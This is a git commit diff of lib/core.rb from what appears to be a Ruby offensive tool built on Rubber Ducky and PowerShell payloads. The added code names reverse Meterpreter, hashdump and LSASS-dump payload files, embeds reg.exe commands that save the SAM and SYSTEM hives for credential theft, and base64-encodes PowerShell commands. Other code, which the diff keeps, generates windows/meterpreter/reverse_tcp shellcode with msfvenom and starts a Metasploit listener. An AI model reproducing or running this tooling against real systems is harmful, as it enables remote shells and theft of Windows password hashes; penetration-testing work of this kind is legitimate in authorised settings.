f89a227e8cb33c7b9222acab7ef6bb9a1d318449
b00stfr3ak <goduke44@gmail.com>
2013-09-14 01:38:27 -0700

    Added file and text file paths
    Got rid of class var
    added bin to hex for latter payload

--- lib/core.rb
+++ lib/core.rb
@@ -13,26 +13,60 @@ module MainCommands
   end 
   def get_input(text)
     print "\e[33m[!]\e[0m #{text}"
-  end 
-  def encode_command(command)
-    Base64.encode64(command.encode("utf-16le")).delete("\r\n")
   end
-  def random_name_gen(name_length = 6)
-    file_name = name_length.to_i.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9'].sample}.join
+  def file_root
+    File.expand_path(File.dirname($0))
+  end
+  def text_path
+    file_root + '/text_files/'
+  end
+  def duck_encode_file
+    file_root + '/duck_encoder/'
+  end
+  def reverse_meterpreter_file
+    'powershell_reverse_ducky.txt'
+  end
+  def hash_dump_file
+    'hashdump_tcp.txt'
+  end
+  def lsass_dump_file
+    'lsassdump_tcp.txt'
+  end
+  def wget_file
+    'wget_powershell.txt'
+  end
+  def save_sam
+    'reg.exe save HKLM\SAM c:\windows\temp\sam'
+  end
+  def save_sys
+    'reg.exe save HKLM\SYSTEM c:\windows\temp\sys'
+  end
+  def encode_command(command)
+    Base64.encode64(command.encode('utf-16le')).delete("\r\n")
+  end
+  def random_name_gen
+    random_length = rand(4..8)
+    file_name = random_length.to_i.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9'].sample}.join
     return file_name
+  end
+  def to_bin(hex_string)
+    hex_string.scan(/../).map { |x| x.hex.chr }.join
+  end
+  def from_bin(file)
+    file.each_byte.map { |b| b.to_s(16) }.join
   end
 end
 module MsfCommands
   def generate_shellcode(host,port)
     if File.exist?('/usr/bin/msfvenom')
       @msf_path = '/usr/bin/'
-    elsif File.exist?("/opt/metasploit-framework/msfvenom")
+    elsif File.exist?('/opt/metasploit-framework/msfvenom')
       @msf_path = ('/opt/metasploit-framework/')
     else
-      print_error("Metasploit Not Found!")
+      print_error('Metasploit Not Found!')
       exit
     end
-    @set_payload = "windows/meterpreter/reverse_tcp"
+    @set_payload = 'windows/meterpreter/reverse_tcp'
     print_info("Generating shellcode\n")
     execute  = `#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
     print_success("Shellcode Generated\n")
@@ -40,8 +74,8 @@ module MsfCommands
     return shellcode
   end
   def clean_shellcode(shellcode)
-    shellcode = shellcode.gsub('\\',",0")
-    shellcode = shellcode.delete("+")
+    shellcode = shellcode.gsub('\\', ',0')
+    shellcode = shellcode.delete('+')
     shellcode = shellcode.delete('"')
     shellcode = shellcode.delete("\n")
     shellcode = shellcode.delete("\s")
@@ -50,7 +84,7 @@ module MsfCommands
   end
   def metasploit_setup(host,port)
     file_path = 'metaspoit_files/'
-    rc_file = "msf_listener.rc"
+    rc_file = 'msf_listener.rc'
     print_info("Setting up Metasploit this may take a moment\n")
     file = File.open("#{file_path}#{rc_file}",'w')
     file.write("use exploit/multi/handler\n")
@@ -59,7 +93,7 @@ module MsfCommands
     file.write("set LPORT #{port}\n")
     file.write("set EnableStageEncoding true\n")
     file.write("set ExitOnSession false\n")
-    file.write("exploit -j")
+    file.write('exploit -j')
     file.close
     system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
   end
